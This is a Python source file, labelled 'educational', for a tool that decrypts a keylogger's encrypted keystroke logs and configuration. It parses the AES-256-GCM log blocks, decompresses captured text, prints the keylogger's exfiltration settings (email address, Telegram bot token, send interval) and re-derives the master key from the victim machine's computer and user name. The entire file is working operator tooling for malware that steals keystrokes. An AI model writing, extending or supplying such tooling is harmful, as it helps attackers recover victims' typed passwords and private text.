"""
Keylogger Decryptor Tool - Educational Purpose Only
Decrypts .dat log files and .enc config files from the keylogger
Usage: python decryptor.py [--input FILE] [--output DIR] [--config]
"""

import os
import sys
import json
import zlib
import argparse
import hashlib
import secrets
from pathlib import Path
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32api
import sqlite3
import base64

class CryptoManager:
    """AES-256-GCM decryption - matching keylogger's encryption"""
    
    def __init__(self, key_path: Path):
        self.key_path = key_path
        self.master_key = self._load_key()
    
    def _load_key(self) -> bytes:
        """Load the 32-byte AES key from file"""
        if not self.key_path.exists():
            raise FileNotFoundError(f"Key file not found: {self.key_path}")
        
        key = self.key_path.read_bytes()
        if len(key) != 32:
            raise ValueError(f"Invalid key size: {len(key)} bytes (expected 32)")
        return key
    
    def decrypt(self, encrypted: bytes) -> bytes:
        """
        Decrypt AES-256-GCM encrypted data
        Format: [IV:12] [TAG:16] [CIPHERTEXT]
        """
        if len(encrypted) < 28:
            raise ValueError("Encrypted data too short")
        
        iv = encrypted[:12]
        tag = encrypted[12:28]
        ciphertext = encrypted[28:]
        
        cipher = Cipher(
            algorithms.AES(self.master_key),
            modes.GCM(iv, tag),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize()


class LogDecryptor:
    """Decrypt and parse keylogger log files"""
    
    def __init__(self, key_path: Path):
        self.crypto = CryptoManager(key_path)
    
    def decrypt_log_file(self, input_path: Path) -> str:
        """
        Decrypt a .dat log file
        Format: [LENGTH:4] [ENCRYPTED_DATA] repeated
        """
        if not input_path.exists():
            raise FileNotFoundError(f"Log file not found: {input_path}")
        
        data = input_path.read_bytes()
        offset = 0
        all_lines = []
        block_num = 0
        
        print(f"[+] Decrypting: {input_path.name} ({len(data)} bytes)")
        
        while offset < len(data):
            try:
                if offset + 4 > len(data):
                    print(f"[-] Warning: Incomplete block at offset {offset}")
                    break
                
                block_len = int.from_bytes(data[offset:offset+4], 'little')
                offset += 4
                if offset + block_len > len(data):
                    print(f"[-] Warning: Block {block_num} truncated")
                    break
                
                encrypted = data[offset:offset+block_len]
                offset += block_len
                decrypted = self.crypto.decrypt(encrypted)
                decompressed = zlib.decompress(decrypted)
                text = decompressed.decode('utf-8', errors='replace')
                
                all_lines.append(f"=== BLOCK {block_num} ===\n")
                all_lines.append(text)
                all_lines.append("\n")
                
                block_num += 1
                
            except Exception as e:
                print(f"[-] Error decrypting block {block_num}: {e}")
                break
        
        return "\n".join(all_lines)
    
    def decrypt_config(self, config_path: Path) -> dict:
        """
        Decrypt the encrypted configuration file
        """
        if not config_path.exists():
            raise FileNotFoundError(f"Config file not found: {config_path}")
        
        encrypted = config_path.read_bytes()
        decrypted = self.crypto.decrypt(encrypted)
        config_json = decrypted.decode('utf-8')
        return json.loads(config_json)


def recover_master_key_from_machine(machine_id: str, salt: bytes = b'keylogger_salt') -> bytes:
    """
    Recover master key from machine ID (for educational purposes)
    This matches the keylogger's key derivation
    """
    return hashlib.pbkdf2_hmac(
        'sha256',
        machine_id.encode(),
        salt,
        100000
    )


class DecryptorTool:
    def __init__(self, key_path: Path):
        self.key_path = key_path
        self.decryptor = LogDecryptor(key_path)
    
    def process_logs(self, log_dir: Path, output_dir: Path):
        """Process all .dat files in a directory"""
        log_files = list(log_dir.glob("*.dat"))
        
        if not log_files:
            print(f"[-] No .dat files found in {log_dir}")
            return
        
        print(f"[+] Found {len(log_files)} log files")
        
        for log_file in log_files:
            try:
                decrypted = self.decryptor.decrypt_log_file(log_file)
                output_file = output_dir / f"{log_file.stem}_decrypted.txt"
                output_file.write_text(decrypted, encoding='utf-8')
                print(f"[+] Saved: {output_file}")
                raw_file = output_dir / f"{log_file.stem}_raw.txt"
                with open(raw_file, 'w', encoding='utf-8') as f:
                    for line in decrypted.split('\n'):
                        if line.strip():
                            f.write(line + '\n')
                print(f"[+] Raw: {raw_file}")
                
            except Exception as e:
                print(f"[-] Failed to decrypt {log_file.name}: {e}")
    
    def process_config(self, config_path: Path, output_dir: Path):
        """Decrypt and display configuration"""
        try:
            config = self.decryptor.decrypt_config(config_path)
            output_file = output_dir / "config_decrypted.json"
            output_file.write_text(json.dumps(config, indent=2), encoding='utf-8')
            print(f"[+] Config saved: {output_file}")
            print("\n[+] Config Settings:")
            print(f"    - Send interval: {config.get('send_interval_sec', 'N/A')}s")
            print(f"    - Max log size: {config.get('max_log_size_mb', 'N/A')}MB")
            print(f"    - Email: {config.get('email_primary', 'N/A')}")
            print(f"    - Telegram: {config.get('telegram_bot_token', 'N/A')[:10]}...")
            
        except Exception as e:
            print(f"[-] Failed to decrypt config: {e}")
    
    def extract_metadata(self, log_dir: Path, output_dir: Path):
        """Extract statistics and metadata from logs"""
        log_files = list(log_dir.glob("*.dat"))
        
        if not log_files:
            return
        
        stats = {
            'total_files': len(log_files),
            'total_size': sum(f.stat().st_size for f in log_files),
            'files': []
        }
        
        for log_file in log_files:
            stats['files'].append({
                'name': log_file.name,
                'size': log_file.stat().st_size,
                'modified': datetime.fromtimestamp(log_file.stat().st_mtime).isoformat()
            })
        
        stats_file = output_dir / "metadata.json"
        stats_file.write_text(json.dumps(stats, indent=2))
        print(f"[+] Metadata saved: {stats_file}")

def try_recover_key_from_system(key_path: Path) -> bool:
    """
    Attempt to recover key from system information
    (Educational: shows how key is derived)
    """
    try:
        computer_name = win32api.GetComputerName()
        user_name = win32api.GetUserName()
        machine_id = computer_name + user_name
        recovered_key = recover_master_key_from_machine(machine_id)
        test_crypto = CryptoManager(key_path)
        test_key = test_crypto.master_key
        
        if recovered_key == test_key:
            print("[+] Key recovered successfully from system info!")
            return True
        else:
            print("[-] Key mismatch - key may be stored elsewhere")
            return False
            
    except Exception as e:
        print(f"[-] Key recovery failed: {e}")
        return False
    
def main():
    parser = argparse.ArgumentParser(
        description='Keylogger Decryptor Tool - Educational Use Only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  # Decrypt all logs in a directory
  python decryptor.py -i ./SysCache -o ./decrypted
  
  # Decrypt a specific log file
  python decryptor.py -i ./SysCache/cache.dat -o ./decrypted
  
  # Decrypt config file
  python decryptor.py --config ./SysCache/settings.enc -o ./decrypted
  
  # Try to recover key from system
  python decryptor.py --recover-key ./SysCache/sys.key
        """
    )
    
    parser.add_argument(
        '-i', '--input',
        help='Input file or directory containing encrypted logs'
    )
    parser.add_argument(
        '-o', '--output',
        default='./decrypted_logs',
        help='Output directory (default: ./decrypted_logs)'
    )
    parser.add_argument(
        '--config',
        action='store_true',
        help='Decrypt configuration file (use with -i)'
    )
    parser.add_argument(
        '--key',
        default='./SysCache/sys.key',
        help='Path to key file (default: ./SysCache/sys.key)'
    )
    parser.add_argument(
        '--recover-key',
        metavar='KEY_FILE',
        help='Attempt to recover key from system (for testing)'
    )
    parser.add_argument(
        '--metadata',
        action='store_true',
        help='Extract metadata from logs without full decryption'
    )
    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Show detailed progress'
    )
    
    args = parser.parse_args()
    if args.recover_key:
        key_path = Path(args.recover_key)
        if key_path.exists():
            try_recover_key_from_system(key_path)
        else:
            print(f"[-] Key file not found: {key_path}")
        return
    if not args.input:
        parser.print_help()
        sys.exit(1)
    
    input_path = Path(args.input)
    output_dir = Path(args.output)
    key_path = Path(args.key)
    if not key_path.exists():
        print(f"[-] Key file not found: {key_path}")
        print("[!] Try using --recover-key to generate from system info")
        sys.exit(1)
    output_dir.mkdir(parents=True, exist_ok=True)
    tool = DecryptorTool(key_path)
    if args.config:
        tool.process_config(input_path, output_dir)
        return
    if args.metadata:
        tool.extract_metadata(input_path, output_dir)
        return
    if input_path.is_file():
        if input_path.suffix == '.dat':
            decrypted = tool.decryptor.decrypt_log_file(input_path)
            output_file = output_dir / f"{input_path.stem}_decrypted.txt"
            output_file.write_text(decrypted, encoding='utf-8')
            print(f"[+] Decrypted: {output_file}")
        else:
            print(f"[-] Unsupported file type: {input_path.suffix}")
    elif input_path.is_dir():
        tool.process_logs(input_path, output_dir)
        if args.verbose:
            tool.extract_metadata(input_path, output_dir)
    else:
        print(f"[-] Invalid input: {input_path}")
        sys.exit(1)
    
    print("\n[+] Decryption complete!")
    print(f"[+] Output directory: {output_dir}")


if __name__ == "__main__":
    main()